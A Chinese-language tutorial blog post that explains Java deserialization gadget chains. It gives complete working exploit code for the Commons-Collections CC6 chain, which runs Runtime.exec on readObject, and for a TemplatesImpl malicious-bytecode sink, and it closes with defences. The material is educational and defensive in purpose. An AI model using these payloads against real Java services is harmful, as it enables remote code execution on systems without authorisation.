---
title: Java 反序列化 Gadget 链入门
date: 2026-07-24
categories: 
- Java基础
- 漏洞分析
tags: 
- 反序列化
- gadget
- Java安全
- CommonsCollections
- 漏洞原理
---

# Java 反序列化 Gadget 链入门

[《Java基础》]({% post_url 2025-12-29-Java基础 %}) 里讲过序列化与反序列化：对象 → 字节流 → 还原对象。理解到这一步之后，大多数人都会卡在同一个地方——**`readObject()` 明明只是把对象还原出来，凭什么就能执行命令？**

本文用一个认知转变开头，然后从零把一条最简单的 gadget 链（CC6）逐层拼起来。拼完这条链，你对"反序列化 RCE"的理解就过关了。

> 先说结论：**gadget 链 = 用目标上现成的类，把"反序列化自动触发的方法"接成一条通向危险方法的调用链。**

---

## 一、先想通一件事：payload 里没有代码

反序列化漏洞最反直觉的地方在于：**攻击者发送的字节流里，一行代码都没有。**

```
攻击者发送：序列化后的对象图描述（只有类名 + 字段名 + 字段值）
目标执行：readObject() 用【目标自己 classpath 上的类】把这些对象 new 出来
```
真正"执行代码"的是目标上已有的类。攻击者只做了一件事：**设计这张对象图，让"还原对象的过程"被迫调用一串方法，最终落进一个危险方法。**

> 类比：payload 不是炸弹，而是"多米诺骨牌怎么摆"的说明书。牌是目标上现成的类，摆法由攻击者决定，`readObject()` 就是推倒第一张牌的那只手。

---

## 二、为什么"还原对象"会调用方法

这不是漏洞行为，是 Java 集合类的**固有设计**。反序列化时，集合类要重建自己的内部结构，必然会调用里面对象的某些方法：

| 类 | readObject 时自动做的事 | 触发的方法 |
|----|------------------------|-----------|
| `HashMap` | 重新 put 所有条目 | `key.hashCode()` |
| `HashSet` | 重新 add 元素 | `key.hashCode()` |
| `PriorityQueue` | 重建堆 | `comparator.compare(a, b)` |
| `TreeMap` | 重建红黑树 | `key.compareTo()` |

所以只要让 `key` / `comparator` 是一个"被精心设计的对象"，反序列化那一刻就会自动触发它的 `hashCode()` / `compareTo()` —— **这就是整个攻击的入口**。

---

## 三、三个名词：Sink / Gadget / Chain

| 名词 | 含义 | 例子 |
|------|------|------|
| **Sink（落点）** | 真正危险的方法 | `Runtime.exec`、`Method.invoke`、`TemplatesImpl.newTransformer` |
| **Gadget（小工具）** | 目标 classpath 上某个类，被调用时产生攻击者有用的动作（通常是"再调下一个方法"） | `InvokerTransformer`、`LazyMap`、`TiedMapEntry` |
| **Gadget Chain（链）** | 从 readObject 自动触发的方法，一步步级联到 Sink 的完整调用序列 | CC1 / CC6 / CC3 等 |

gadget 英文原意是"小装置"，安全圈借指"攻击链里一段可利用的代码/类"。理解它的关键：**每一块 gadget 都不知道自己在被用来攻击**——它只是一个"被调用就干活"的普通类，单独看完全无害，拼起来就是 RCE。

---

## 四、第一个 gadget：InvokerTransformer

`org.apache.commons.collections.functors.InvokerTransformer`（commons-collections 3.x）的 `transform(Object)` 方法，可以**反射调用任意对象上的任意方法**：

```java
InvokerTransformer t = new InvokerTransformer(
    "exec",                          // 要调用的方法名
    new Class[]{String.class},       // 方法参数类型
    new Object[]{"calc"});           // 方法参数值

t.transform(Runtime.getRuntime());   // 等价于 Runtime.getRuntime().exec("calc")
```
**它就是整条链的"引擎"**：任何一次 `transform(x)` 调用，都会变成"在 x 上反射调用任意方法"。这一步把"无害的 transform"和"危险的方法调用"焊在了一起。

---

## 五、把多个 gadget 串起来：ChainedTransformer

`ChainedTransformer.transform(obj)` 会依次调用数组里每个 transformer 的 `transform(obj)`：

```java
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),                  // 1. 返回 Runtime.class（不变）
    new InvokerTransformer("getMethod",                      // 2. 反射拿 getRuntime 方法
        new Class[]{String.class, Class[].class},
        new Object[]{"getRuntime", new Class[0]}),
    new InvokerTransformer("invoke",                         // 3. 反射调用 getRuntime() → 实例
        new Class[]{Object.class, Object[].class},
        new Object[]{null, new Object[0]}),
    new InvokerTransformer("exec",                           // 4. 反射调用 exec("calc")
        new Class[]{String.class},
        new Object[]{"calc"})
};
ChainedTransformer chain = new ChainedTransformer(transformers);
chain.transform(null);   // 依次执行 1→2→3→4 → Runtime.getRuntime().exec("calc")
```
> 为什么不直接 `new InvokerTransformer("exec", ...)` 一步到位？因为 `Runtime` 构造方法是私有的，必须先反射 `getMethod("getRuntime")` 拿到方法、再 `invoke` 得到实例，最后才能 `exec`。这就是 payload 里常见"getMethod → invoke → exec"三段式的原因。

![image-20260810092032949](/images/2026-07-24-Java反序列化Gadget链入门.assets/image-20260810092032949.png)

到这里，"有 `transform()` 调用 → 就执行命令"已经成立。现在的问题是：**反序列化时，谁会去调 `transform()`？**

---

## 六、谁来触发 transform：LazyMap

### 6.1 LazyMap 的"懒加载"特性

`LazyMap`（`org.apache.commons.collections.map.LazyMap`，commons-collections 3.x）是一个**装饰器**：它包住一个普通 Map，并带一个 `factory`。它对不存在的 key 不返回 `null`，而是**用 `factory.transform(key)` 现算一个值并缓存**——设计本意是"延迟初始化"（值比较贵、用到才生成）：

```java
// LazyMap 继承 AbstractMapDecorator，被装饰的 map 存在父类的 map 字段里，所以用 super.map 访问
public Object get(Object key) {
    if (!super.map.containsKey(key)) {                 // ① 内层 map 里没有这个 key
        Object value = this.factory.transform(key);    // ② 用 factory 现算一个值
        super.map.put(key, value);                     // ③ 算完存进缓存
        return value;
    } else {                                           // ④ 有 key 就直接返回缓存值
        return super.map.get(key);
    }
}
```

### 6.2 `LazyMap.decorate(new HashMap(), chain)` 做了什么

`decorate` 是 `LazyMap` 的**静态工厂方法**（构造器是 protected，只能走它）：

```java
public static Map decorate(Map map, Transformer factory) {
    return new LazyMap(map, factory);
}
```

所以 `LazyMap.decorate(new HashMap(), chain)` = `new LazyMap(空 HashMap, chain)`，LazyMap 内部只存两样东西：

- **`map`**：传入的空 `HashMap`（被装饰的内层容器）；
- **`factory`**：`chain`（那个 `ChainedTransformer`）。

于是"对空 map 调 `get(任意不存在的 key)`"就被改写成"执行整条 transformer 链"：

```java
Map lazyMap = LazyMap.decorate(new HashMap(), chain);   // map=空HashMap, factory=chain
lazyMap.get("任何不存在的key");
// → containsKey == false → factory.transform("key")
// → chain.transform("key") → getMethod → invoke → exec → RCE！
```

> **关键**：`LazyMap` 把"一次无害的 `map.get(缺的 key)`"变成"调用任意 `factory.transform`"，而 `factory` 是攻击者可控的 `Transformer`——这就是把"集合操作"改写成"执行链"的转换器。

现在链条推进到：`LazyMap.get(key) → factory.transform(key) → ... → exec`。

![image-20260810093653867](/images/2026-07-24-Java反序列化Gadget链入门.assets/image-20260810093653867.png)

---

## 七、反序列化入口：HashMap.readObject → hashCode → TiedMapEntry

还差最后一步：反序列化时，谁会调用 `LazyMap.get()`？

### 7.1 TiedMapEntry：hashCode 是入口

`TiedMapEntry` 是"绑定了一个 map 和 key"的条目，它实现 `Map.Entry`。它的 `hashCode()` **第一行就调用了 `getValue()`——钩子就在这里**：

```java
public int hashCode() {
    Object value = this.getValue();   // ← 第一行就调 getValue()
    return (this.getKey() == null ? 0 : this.getKey().hashCode())
           ^ (value == null ? 0 : value.hashCode());
}
```

而 `getValue()` 内部就是 `map.get(key)`：

```java
public Object getValue() {
    return map.get(key);   // ← 关键：调用了 LazyMap.get()
}
```

> 后半段的 `key.hashCode() ^ value.hashCode()` 只是让对象有一个合理的哈希值、方便被放进 HashMap，**与攻击无关**。真正的触发点在第一行的 `getValue()`。

### 7.2 HashMap.readObject：反序列化时自动调 hashCode

`HashMap.readObject()` 重建条目时会对每个 key 调 `hashCode()`（见第二节）：

```java
// HashMap.readObject 内部（简化）
for (int i = 0; i < mappings; i++) {
    K key = (K) s.readObject();
    putVal(hash(key), key, value, false, false);   // hash(key) 会调 key.hashCode()
}
```

所以让 `HashMap` 的 key 是那个 `TiedMapEntry`，反序列化就自动触发整条链：

```java
TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");
// 反序列化时：HashMap.readObject → key.hashCode() → getValue() → lazyMap.get("key") → chain.transform → RCE
```

```
HashMap.readObject()
  → hash(key) → key.hashCode()        ← key = TiedMapEntry
  → TiedMapEntry.hashCode()
  → getValue() → LazyMap.get(key)     ← 命中 6.2 的 factory.transform
  → chain.transform() → RCE
```

---

## 八、完整链（CC6）拼起来

```
HashMap.readObject()                          ← 入口（集合固有行为）
  → hash(key) → key.hashCode()                ← key = TiedMapEntry
  → TiedMapEntry.hashCode()
  → this.map.get(key)                         ← map = LazyMap
  → LazyMap.get(key)
  → !containsKey(key) → factory.transform()   ← factory = ChainedTransformer
  → ChainedTransformer.transform()
  → InvokerTransformer.transform() × 3        ← getMethod → invoke → exec
  → Runtime.getRuntime().exec("calc")         ← Sink：RCE
```
### 8.1 先手工验证：证明链本身是通的

```java
// 不经过反序列化，直接手工构造并触发 —— 链通的话会弹出 calc
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod",
        new Class[]{String.class, Class[].class},
        new Object[]{"getRuntime", new Class[0]}),
    new InvokerTransformer("invoke",
        new Class[]{Object.class, Object[].class},
        new Object[]{null, new Object[0]}),
    new InvokerTransformer("exec",
        new Class[]{String.class}, new Object[]{"calc"})
};
ChainedTransformer chain = new ChainedTransformer(transformers);
Map lazyMap = LazyMap.decorate(new HashMap(), chain);
TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");
entry.hashCode();   // ← 触发点，等价于整条链
```
> 这一步很重要：**先证明"手工触发能通"，再谈反序列化触发**。把整条链拆成"触发点方法调用" + "触发源是谁"，是理解所有链的通用方法。

![image-20260810093854378](/images/2026-07-24-Java反序列化Gadget链入门.assets/image-20260810093854378.png)

### 8.2 再封装成真正的反序列化 payload

> ⚠️ **先抄这个辅助方法**：下面主代码用到的 `setFieldValue` 是**自定义方法**

```java
// 辅助方法：反射修改 ChainedTransformer 的私有字段 iTransformers
public static void setFieldValue(Object obj, String name, Object value) throws Exception {
    Field f = obj.getClass().getDeclaredField(name);
    f.setAccessible(true);
    f.set(obj, value);
}
```

```java
// 两个关键细节：
// ① 构造链时先用无害占位 transformer，避免本地构造阶段就触发 exec
ChainedTransformer chain = new ChainedTransformer(
    new Transformer[]{new ConstantTransformer(1)});

Map lazyMap = LazyMap.decorate(new HashMap(), chain);
TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");

// ② 外层 HashMap：readObject 时会调 entry.hashCode()
Map expMap = new HashMap();
expMap.put(entry, "value");
lazyMap.remove("key");   // ★ put 时 LazyMap 已经把 key 加进去了，
                         //   必须移除，否则反序列化时 key 已存在、不会触发 transform

// ③ 最后把真正的链换进去（反射），再序列化
setFieldValue(chain, "iTransformers", transformers);

ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("poc.ser"));
oos.writeObject(expMap);
```
```java
// 目标端：一句 readObject 就 RCE
ObjectInputStream ois = new ObjectInputStream(new FileInputStream("poc.ser"));
ois.readObject();   // ← 弹出计算器
```
> 这段代码就是 ysoserial 里 `CommonsCollections6` 的手写简化版。LazyMap/TiedMapEntry/ChainedTransformer 全部来自 `commons-collections 3.2.1`（Shiro 1.2.4 等老框架自带）。

![image](/images/2026-07-24-Java反序列化Gadget链入门.assets/image-20260810094947625.png)

## 九、另一个更强的 sink：TemplatesImpl（加载任意字节码）

CC6 依赖 `commons-collections`。而 `TemplatesImpl` 是 **JDK 自带**的，并且能干更狠的事——**加载攻击者提供的任意字节码**，不要求目标 classpath 上存在这个类。

### 9.1 它本来是干嘛的（XSLT 编译器）

`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` 是 JDK 里 Xalan XSLT 处理器的核心类：负责把 XSLT 样式表**编译成字节码（translet 类）并缓存**，供 XML 转换使用。它内部用一个**自定义 ClassLoader** 把"字节数组里的类"加载进 JVM。

**攻击点**：它要加载的类字节码存在**私有字段 `_bytecodes`** 里，而 Java 反序列化会原样恢复私有字段——攻击者把 `_bytecodes` 填成恶意类的字节码，再让链触发 `newTransformer()`，就加载并执行了攻击者的类。

### 9.2 利用要设置的三个字段

| 字段 | 类型 | 作用 | 利用时的值 |
|------|------|------|-----------|
| `_bytecodes` | `byte[][]` | 要加载的类字节码（可多个） | `new byte[][]{恶意类字节码}` |
| `_name` | `String` | translet 类名 | 任意非 null 字符串（为 null 会抛异常） |
| `_tfactory` | `TransformerFactoryImpl` | 加载时要用（见 9.3） | `new TransformerFactoryImpl()` |

```java
// setFieldValue 同 8.2 的自定义辅助方法（需自己实现，且 import java.lang.reflect.Field）
TemplatesImpl templates = new TemplatesImpl();
setFieldValue(templates, "_bytecodes", new byte[][]{恶意类的字节码});
setFieldValue(templates, "_name", "Evil");
setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
```

### 9.3 加载流程：newTransformer → getTransletInstance → defineTransletClasses

```
templates.newTransformer()
  → getTransletInstance()
  │    ├─ 检查 _name != null（否则抛异常）
  │    ├─ if (_class == null) defineTransletClasses()   ← 第一次调用才加载
  │    └─ _translet = _class[i].newInstance()            ← 实例化 → 静态块触发！
  → defineTransletClasses()
       ├─ 用 _tfactory.getExternalExtensionsMap() 确保内部类加载器可用
       ├─ loader = new TransletClassLoader(...)          ← TemplatesImpl 内部自带的 ClassLoader
       └─ 逐个 _class[i] = loader.defineClass(_bytecodes[i])   ← 直接加载攻击者的字节码
```

**关键点**：加载用的是 `TemplatesImpl` 内部自带的 `TransletClassLoader`（重写了 `defineClass`），字节码**直接来自 `_bytecodes` 数组、不经过 classpath**——这就是"加载任意字节码"的含义。

### 9.4 恶意类必须继承 AbstractTranslet

`getTransletInstance()` 会把加载的类**强转成 `AbstractTranslet`** 再 `newInstance()`，所以恶意类必须继承 `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`，并实现它的两个抽象 `transform` 方法（空实现即可）。命令写在**静态块**里——类被实例化时触发 `<clinit>` 执行：

```java
public class Evil extends AbstractTranslet {
    static {
        Runtime.getRuntime().exec("open -a Calculator");   // ← 命令在这里
    }
    @Override public void transform(DOM d, SerializationHandler[] h) {}
    @Override public void transform(DOM d, DTMAxisIterator i, SerializationHandler h) {}
}
```

### 9.5 恶意字节码从哪来：手动 vs 自动化

字节码是 `CA FE BA BE...` 的二进制，**人没法手写**。两种造法：

- **手动（理解原理用）**：写上面的 `Evil.java` → `javac` 编译 → 读 `Evil.class` 的字节塞进 `_bytecodes`；
- **自动化（实战用）**：用 javassist 在**内存里**替你完成"写类 + 编译 + 拿字节"，只需传一条命令字符串。

```java
// 等价于"手动写 Evil.java + javac + 读字节"三步，全自动
TemplatesImpl templates = ExploitUtil.createTemplatesImpl("open -a Calculator");
```

> 这就是无文件注入里"恶意类不在目标 classpath 也能执行"的原因——**字节码是攻击者生成的，加载由 TemplatesImpl 内部完成**。

### 9.6 在链里怎么触发：TrAXFilter 构造

`newTransformer()` 是 public 无参方法，但它自己不会凭空执行——在链里通常由 `InstantiateTransformer` 构造一个 `TrAXFilter` 来触发，因为 **`TrAXFilter` 的构造方法里会调 `templates.newTransformer()`**：

```
InstantiateTransformer(TrAXFilter.class, [Templates.class], [templates])
  → new TrAXFilter(templates)
  → TrAXFilter 构造方法里调 templates.newTransformer()   ← 触发点
  → 进入 9.3 的加载流程 → RCE
```

### 9.7 为什么它"万能"

1. **JDK 自带**，不依赖第三方库，通杀面大（`Runtime.exec` 那套还要 commons-collections 的 `InvokerTransformer`）；
2. **能加载任意字节码** → 不只是执行一条命令，可以加载内存马注入类等**任意代码**——[《反序列化与 JNDI 无文件注入内存马》]({% post_url 2026-07-28-反序列化与JNDI无文件注入内存马 %}) 里把"注入类"送进 JVM，就是靠它（Shiro 的 CC2 / CC3 / CommonsBeanutils1 都用 TemplatesImpl）。

### 9.8 入口 × sink：一份配方表

`TemplatesImpl` 只是一个 **sink**，配上不同的入口就组成不同的链：

| 入口（谁触发） | 中间 | sink = 字节码加载 | 链名 |
|----------------|------|------------------|------|
| `HashMap → TiedMapEntry → LazyMap` | `ChainedTransformer` | `TrAXFilter → TemplatesImpl` | **CC3** |
| `PriorityQueue → TransformingComparator` | `InvokerTransformer("newTransformer")` | `TemplatesImpl` | **CC2** |
| `PriorityQueue → BeanComparator` | `PropertyUtils.getProperty` | `TemplatesImpl` | **CB1** |

对比入口为 `exec` 的链：`HashMap → TiedMapEntry → LazyMap` + `Runtime.exec` = **CC6**。

> 反序列化链 = **入口 × sink** 的排列组合：入口解决"readObject 会自动调哪个方法"，sink 解决"最后一环干什么"。看懂这两件事，所有链都是同一张配方表。

### 常见 Sink 一览

| Sink | 作用 | 依赖 | 典型触发 |
|------|------|------|---------|
| `Runtime.exec` | 执行命令 | JDK | 反射调用 |
| `InvokerTransformer` | 反射调用任意方法 | commons-collections | `transform()` |
| `TemplatesImpl.newTransformer` | 加载任意字节码 | JDK | `TrAXFilter` 构造 / 方法调用 |
| `JdbcRowSetImpl.setAutoCommit` | 触发 JNDI lookup | JDK | Fastjson setter 调用 |

> 后两个都是 JDK 自带，所以才会在 Fastjson（`JdbcRowSetImpl`）、Shiro（`TemplatesImpl`）里反复出现——见[《Fastjson反序列化漏洞深度剖析》]({% post_url 2026-02-16-Fastjson反序列化漏洞深度剖析 %})。

---

## 十、gadget 从哪来 + 怎么找链

- **gadget 是目标 classpath 上的现有类**。同一个目标上，`commons-collections`、`commons-beanutils`、`c3p0`、以及 JDK 自带类（`TemplatesImpl`、`JdbcRowSetImpl`）都可能当 gadget；
- **找链 = 从入口到 sink 找一条调用路径**。ysoserial 已经把常用链写好了（`CommonsCollections1/2/6`、`CommonsBeanutils1`、`JRMPClient` 等），你可以直接借鉴思路；
- **实战先摸依赖**：`find . -name "commons-collections*.jar" -o -name "commons-beanutils*.jar"`，再决定用哪条链。

---

## 十一、验证 / 调试一条链

1. **先手工触发**（如 8.1），确认链本身通不通；
2. 序列化 payload，在**独立沙箱**里 `readObject()` 验证，别在真实目标上试；
3. 打日志 / 断点观察方法调用顺序，对照预期链，找到卡在哪一环。

---

## 十二、检测与防御

| 层面 | 措施 |
|------|------|
| 入口 | 不反序列化不可信数据；用 JSON 等安全格式替代 |
| 过滤 | `ObjectInputFilter`（JDK 9+）做白名单，禁止反序列化 gadget 类 |
| 依赖 | 升级 `commons-collections` 到 3.2.2+（默认禁用 InvokerTransformer 反序列化） |
| 组件 | Shiro 换随机密钥、Fastjson 开 SafeMode（见对应文章） |

---

## 总结

一句话：**gadget 链 = 用目标上现成的类，把"反序列化自动触发的方法"接成一条通向危险方法的调用链。**

把四个认知串起来：

1. **payload 没有代码，只有对象图**——执行代码的是目标上的类；
2. **readObject 还原对象时会自动调 `hashCode` / `compareTo` 等方法**（入口）；
3. **每个 gadget 是"被调用就产生有用动作"的普通类**（跳板）；
4. **从入口一路级联到 `Runtime.exec` 或 `TemplatesImpl`**（落点）。

建议动手做一遍：把第八节的代码跑通，从"手工触发"到"反序列化触发"，这条链你就彻底拿下了。

> **延伸阅读**：[《Java基础》]({% post_url 2025-12-29-Java基础 %}) 的序列化章节 | [《Fastjson反序列化漏洞深度剖析》]({% post_url 2026-02-16-Fastjson反序列化漏洞深度剖析 %}) | [《反序列化与 JNDI 无文件注入内存马》]({% post_url 2026-07-28-反序列化与JNDI无文件注入内存马 %}) | [《内存马原理总纲》]({% post_url 2025-12-26-内存马原理总纲 %})
